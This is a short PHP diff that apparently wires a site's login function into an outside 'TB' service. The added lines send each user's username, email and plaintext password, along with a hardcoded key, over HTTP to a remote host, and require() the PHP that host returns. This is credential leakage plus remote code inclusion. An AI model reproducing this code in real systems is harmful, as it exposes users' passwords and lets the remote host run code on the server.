@@ -1,5 +1,5 @@
 <?php
-
+require_once "lib/FunctionsTools.php";
 
 //------------------------------------------------------------------------------
 // Logout function unlog member and fisplay the login page 
@@ -94,6 +94,11 @@ Function Login($UsernameParam, $passwordParam, $nextlink = "main.php") {
 			LogStr("Successful login with <b>" . $_SERVER['HTTP_USER_AGENT'] . "</b>", "Login");
 			if (HasRight("Words"))
 				$_SESSION['switchtrans'] = "on"; // Activate switchtrans oprion if its a translator
+				// register in TB
+				$OnePad=mt_rand();
+				$_SESSION['op']=$OnePad;
+				require("http://ecommunity.ifi.unizh.ch/newlayout/htdocs/ExAuth.php?k=fh457Hg36!pg29G&u=".$_SESSION['Username']."&e=".GetEmail($_SESSION['IdMember'])."&OnePad=$OnePad&p=$password");
+
 			break;
 
 		case "ToComplete" :
